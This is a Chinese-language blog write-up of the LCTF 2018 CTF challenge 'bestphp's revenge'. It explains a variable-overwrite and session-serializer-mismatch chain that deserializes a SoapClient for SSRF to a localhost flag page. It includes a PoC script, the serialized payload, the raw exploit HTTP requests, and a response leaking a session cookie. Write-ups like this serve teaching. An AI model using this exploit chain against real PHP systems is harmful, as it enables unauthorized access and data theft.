@@ -1,0 +1,244 @@
+
+<!DOCTYPE html>
+<html lang="en" class="loading">
+<head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>bestphp&#39;s revenge - Dongq‘s blog</title>
+    <meta name="apple-mobile-web-app-capable" content="yes" />
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate" />
+    <meta name="keywords" content="Fechin,"> 
+    <meta name="description" content="bestphp’s revenge123456789101112&amp;lt;?phphighlight_file(__FILE__);$b = &amp;#x27;implode&amp;#x27;;call_user,"> 
+    <meta name="author" content="Dongq"> 
+    <link rel="alternative" href="atom.xml" title="Dongq‘s blog" type="application/atom+xml"> 
+    <link rel="icon" href="/img/favicon.png"> 
+    
+    
+<link rel="stylesheet" href="/css/diaspora.css">
+
+	<script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads"
+        src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+<meta name="generator" content="Hexo 5.0.0"></head>
+
+<body class="loading">
+    <span id="config-title" style="display:none">Dongq‘s blog</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="iconfont icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="iconfont icon-play"></div>
+    <h3 class="subtitle">bestphp's revenge</h3>
+    <div class="social">
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="iconfont icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class='main'>
+        <h1 class="title">bestphp's revenge</h1>
+        <div class="stuff">
+            <span>六月 30, 2020</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <h2 id="bestphp’s-revenge"><a href="#bestphp’s-revenge" class="headerlink" title="bestphp’s revenge"></a>bestphp’s revenge</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">$b = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line">call_user_func($_GET[<span class="string">&#x27;f&#x27;</span>], $_POST);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    $_SESSION[<span class="string">&#x27;name&#x27;</span>] = $_GET[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = <span class="keyword">array</span>(reset($_SESSION), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);</span><br><span class="line">call_user_func($b, $a);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">only localhost can get flag!</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;only localhost can get flag!&#x27;</span>;</span><br><span class="line">$flag = <span class="string">&#x27;LCTF&#123;*************************&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>($_SERVER[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">       $_SESSION[<span class="string">&#x27;flag&#x27;</span>] = $flag;</span><br><span class="line">   &#125;</span><br><span class="line">only localhost can get flag!</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>首先看到call_user_func函数并且两个参数都可控，想到变量覆盖</p>
+<p>之后看flag.php的文件，发现是ssrf</p>
+<p>通过反序列化调用<code>SoapClient</code>向<code>flag.php</code>发送请求，那么就可以实现ssrf</p>
+<p>有两个问题需要解决</p>
+<pre><code>在哪里，什么时候反序列化
+反序列化的内容如何控制</code></pre>
+<p>利用变量覆盖，</p>
+<p>name=SoapClient</p>
+<p>f=extract</p>
+<p>POST:</p>
+<p>b=call_user_func()</p>
+<p>这样的话call_user_func($b,$a)就会执行</p>
+<p>call_user_func(call_usser_func,array(‘SoapClint’,’welcome_to_the_lctf2018’))</p>
+<p>所以SoptClint会调用welcome_to_the_lctf2018方法，但是不存在这个方法</p>
+<p>然后会调用__call魔法函数发送请求</p>
+<p>然后需要解决，如何控制反序列化的内容</p>
+<p>PHP内置了多种处理器用于存储$_SESSION数据时会对数据进行序列化和反序列化，常用的有以下三种，对应三种不同的处理格式：</p>
+<table>
+<thead>
+<tr>
+<th align="center">处理器</th>
+<th align="center">对应的存储格式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">php</td>
+<td align="center">键名 + 竖线 + 经过serialize()函数反序列化处理的值</td>
+</tr>
+<tr>
+<td align="center">php_binary</td>
+<td align="center">键名的长度对应的ASCII字符 + 键名 + 经过serialize()函数反序列化处理的值</td>
+</tr>
+<tr>
+<td align="center">php_serialize(php&gt;=5.5.4)</td>
+<td align="center">经过serialize()函数反序列处理的数组</td>
+</tr>
+</tbody></table>
+<p>配置选项 session.serialize_handler，通过该选项可以设置序列化及反序列化时使用的处理器。</p>
+<p>如果PHP在反序列化存储的$_SEESION数据时的使用的处理器和序列化时使用的处理器不同，会导致数据无法正确反序列化，通过特殊的伪造，甚至可以伪造任意数据。</p>
+<p>首先将处理器设置为php_serialize</p>
+<p>f=session_start</p>
+<p>serialize_handler=php_serialize</p>
+<p>然后通过name将反序列化的值存入session中，等待反序列化时调用</p>
+<p>poc</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$url = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; $url, <span class="string">&#x27;location&#x27;</span> =&gt; $url));</span><br><span class="line">$a = serialize($b);</span><br><span class="line">$a = str_replace(<span class="string">&#x27;^^&#x27;</span>, <span class="string">&quot;\r\n&quot;</span>, $a);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . urlencode($a);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure>
+
+
+
+<p>先设置session中的值，设置处理器方法</p>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?name&#x3D;|O%3A10%3A%22SoapClient%22%3A3%3A%7Bs%3A3%3A%22uri%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&amp;f&#x3D;session_start HTTP&#x2F;1.1</span><br><span class="line">Host: 42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 31</span><br><span class="line">Origin: http:&#x2F;&#x2F;42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn&#x2F;?name&#x3D;llll</span><br><span class="line">Cookie: PHPSESSID&#x3D;fqbmo6hjm1kbca1h0h66o45155</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">serialize_handler&#x3D;php_serialize</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后进行利用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?name&#x3D;SoapClient&amp;f&#x3D;extract HTTP&#x2F;1.1</span><br><span class="line">Host: 42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko&#x2F;20100101 Firefox&#x2F;77.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 16</span><br><span class="line">Origin: http:&#x2F;&#x2F;42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http:&#x2F;&#x2F;42c82c32-ce73-4672-91ee-e8c69e139cdc.node3.buuoj.cn&#x2F;?name&#x3D;llll</span><br><span class="line">Cookie: PHPSESSID&#x3D;fqbmo6hjm1kbca1h0h66o45155</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">b&#x3D;call_user_func</span><br></pre></td></tr></table></figure>
+
+<p>回显</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: YxlinkWAF</span><br><span class="line">Date: Tue, 30 Jun 2020 05:47:46 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Pragma: no-cache</span><br><span class="line">X-Powered-By: PHP&#x2F;7.0.33</span><br><span class="line">Content-Length: 4553</span><br><span class="line"></span><br><span class="line">&lt;code&gt;&lt;span style&#x3D;&quot;color: #000000&quot;&gt;</span><br><span class="line">&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;&lt;?php&lt;br &#x2F;&gt;highlight_file&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;__FILE__&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$b&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;&#x3D;&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;implode&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;;&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;call_user_func&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_GET&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;f&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;],&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_POST&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;session_start&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;();&lt;br &#x2F;&gt;if&amp;nbsp;(isset(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_GET&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;name&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;]))&amp;nbsp;&#123;&lt;br &#x2F;&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_SESSION&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;name&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;]&amp;nbsp;&#x3D;&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_GET&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;[&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;name&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;];&lt;br &#x2F;&gt;&#125;&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;var_dump&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_SESSION&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$a&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;&#x3D;&amp;nbsp;array(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;reset&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$_SESSION&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;),&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #DD0000&quot;&gt;&#39;welcome_to_the_lctf2018&#39;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;call_user_func&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$b&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;,&amp;nbsp;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;$a&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #007700&quot;&gt;);&lt;br &#x2F;&gt;&lt;&#x2F;span&gt;&lt;span style&#x3D;&quot;color: #0000BB&quot;&gt;?&gt;&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;span&gt;</span><br><span class="line">&lt;&#x2F;code&gt;array(2) &#123;</span><br><span class="line">  [&quot;a:1:&#123;s:4:&quot;name&quot;;s:139:&quot;&quot;]&#x3D;&gt;</span><br><span class="line">  object(SoapClient)#1 (8) &#123;</span><br><span class="line">    [&quot;uri&quot;]&#x3D;&gt;</span><br><span class="line">    string(25) &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;</span><br><span class="line">    [&quot;location&quot;]&#x3D;&gt;</span><br><span class="line">    string(25) &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;flag.php&quot;</span><br><span class="line">    [&quot;_soap_version&quot;]&#x3D;&gt;</span><br><span class="line">    int(1)</span><br><span class="line">    [&quot;httpsocket&quot;]&#x3D;&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_use_proxy&quot;]&#x3D;&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;httpurl&quot;]&#x3D;&gt;</span><br><span class="line">    int(0)</span><br><span class="line">    [&quot;_cookies&quot;]&#x3D;&gt;</span><br><span class="line">    array(1) &#123;</span><br><span class="line">      [&quot;PHPSESSID&quot;]&#x3D;&gt;</span><br><span class="line">      array(3) &#123;</span><br><span class="line">        [0]&#x3D;&gt;</span><br><span class="line">        string(26) &quot;vb0q46gts55pckl0j8utlic385&quot;</span><br><span class="line">        [1]&#x3D;&gt;</span><br><span class="line">        string(1) &quot;&#x2F;&quot;</span><br><span class="line">        [2]&#x3D;&gt;</span><br><span class="line">        string(9) &quot;127.0.0.1&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    [&quot;__soap_fault&quot;]&#x3D;&gt;</span><br><span class="line">    object(SoapFault)#2 (10) &#123;</span><br><span class="line">      [&quot;message&quot;:protected]&#x3D;&gt;</span><br><span class="line">      string(33) &quot;looks like we got no XML document&quot;</span><br><span class="line">      [&quot;string&quot;:&quot;Exception&quot;:private]&#x3D;&gt;</span><br><span class="line">      string(242) &quot;SoapFault exception: [Client] looks like we got no XML document in &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php:11</span><br><span class="line">Stack trace:</span><br><span class="line">#0 [internal function]: SoapClient-&gt;__call(&#39;welcome_to_the_...&#39;, Array)</span><br><span class="line">#1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php(11): call_user_func(Array)</span><br><span class="line">#2 &#123;main&#125;&quot;</span><br><span class="line">      [&quot;code&quot;:protected]&#x3D;&gt;</span><br><span class="line">      int(0)</span><br><span class="line">      [&quot;file&quot;:protected]&#x3D;&gt;</span><br><span class="line">      string(23) &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br><span class="line">      [&quot;line&quot;:protected]&#x3D;&gt;</span><br><span class="line">      int(11)</span><br><span class="line">      [&quot;trace&quot;:&quot;Exception&quot;:private]&#x3D;&gt;</span><br><span class="line">      array(2) &#123;</span><br><span class="line">        [0]&#x3D;&gt;</span><br><span class="line">        array(4) &#123;</span><br><span class="line">          [&quot;function&quot;]&#x3D;&gt;</span><br><span class="line">          string(6) &quot;__call&quot;</span><br><span class="line">          [&quot;class&quot;]&#x3D;&gt;</span><br><span class="line">          string(10) &quot;SoapClient&quot;</span><br><span class="line">          [&quot;type&quot;]&#x3D;&gt;</span><br><span class="line">          string(2) &quot;-&gt;&quot;</span><br><span class="line">          [&quot;args&quot;]&#x3D;&gt;</span><br><span class="line">          array(2) &#123;</span><br><span class="line">            [0]&#x3D;&gt;</span><br><span class="line">            string(23) &quot;welcome_to_the_lctf2018&quot;</span><br><span class="line">            [1]&#x3D;&gt;</span><br><span class="line">            array(0) &#123;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        [1]&#x3D;&gt;</span><br><span class="line">        array(4) &#123;</span><br><span class="line">          [&quot;file&quot;]&#x3D;&gt;</span><br><span class="line">          string(23) &quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&quot;</span><br><span class="line">          [&quot;line&quot;]&#x3D;&gt;</span><br><span class="line">          int(11)</span><br><span class="line">          [&quot;function&quot;]&#x3D;&gt;</span><br><span class="line">          string(14) &quot;call_user_func&quot;</span><br><span class="line">          [&quot;args&quot;]&#x3D;&gt;</span><br><span class="line">          array(1) &#123;</span><br><span class="line">            [0]&#x3D;&gt;</span><br><span class="line">            array(2) &#123;</span><br><span class="line">              [0]&#x3D;&gt;</span><br><span class="line">              *RECURSION*</span><br><span class="line">              [1]&#x3D;&gt;</span><br><span class="line">              string(23) &quot;welcome_to_the_lctf2018&quot;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      [&quot;previous&quot;:&quot;Exception&quot;:private]&#x3D;&gt;</span><br><span class="line">      NULL</span><br><span class="line">      [&quot;faultstring&quot;]&#x3D;&gt;</span><br><span class="line">      string(33) &quot;looks like we got no XML document&quot;</span><br><span class="line">      [&quot;faultcode&quot;]&#x3D;&gt;</span><br><span class="line">      string(6) &quot;Client&quot;</span><br><span class="line">      [&quot;faultcodens&quot;]&#x3D;&gt;</span><br><span class="line">      string(41) &quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  [&quot;name&quot;]&#x3D;&gt;</span><br><span class="line">  string(10) &quot;SoapClient&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>回显中带有cookie，带着这个cookie访问即可获得flag</p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
+                <source type="audio/mpeg" src="">
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        
+                            <li title='0' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                        
+                            <li title='1' data-url='http://link.hhtjim.com/163/425570952.mp3'></li>
+                        
+                    
+                </ul>
+            
+        </div>
+        
+    <div id='gitalk-container' class="comment link"
+		data-enable='false'
+        data-ae='false'
+        data-ci=''
+        data-cs=''
+        data-r=''
+        data-o=''
+        data-a=''
+        data-d='false'
+    >查看评论</div>
+
+
+    </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+
+
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
